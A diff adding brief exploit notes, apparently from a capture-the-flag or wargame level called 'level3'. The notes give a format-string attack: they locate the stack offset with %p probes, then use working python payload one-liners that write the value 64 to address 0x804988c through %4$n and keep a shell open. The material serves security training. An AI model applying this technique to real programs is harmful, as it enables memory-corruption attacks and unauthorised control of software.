@@ -1,0 +1,26 @@
+fget is protected
+printf can write to memory using %n 
+
+   0x080484da <+54>:    mov    0x804988c,%eax
+   0x080484df <+59>:    cmp    $0x40,%eax
+
+target var -> 0x804988c
+target value -> 0x40 -> 64
+
+format string exploit
+
+find offset
+AAAA = 0x41414141
+ ./level3 
+AAAA %p %p %p %p %p
+AAAA 0x200	0xb7fd1ac0	0xb7ff37d0	0x41414141	0x20702520
+	 1		2			3			4			5
+offset -> 4 ->
+printf %4$n -> write at 4 that will be 0x0804988c
+
+address take 4 byte
+need 64
+print 60 before %4$n
+
+(python -c 'print "\x8c\x98\x04\x08" + "x" * 60 + "%4$n"'; cat) | ./level3
+(python -c  'import sys; sys.stdout.write("\x8c\x98\x04\x08" + "x" * 60 + "%4$n")'; cat) | ./level3
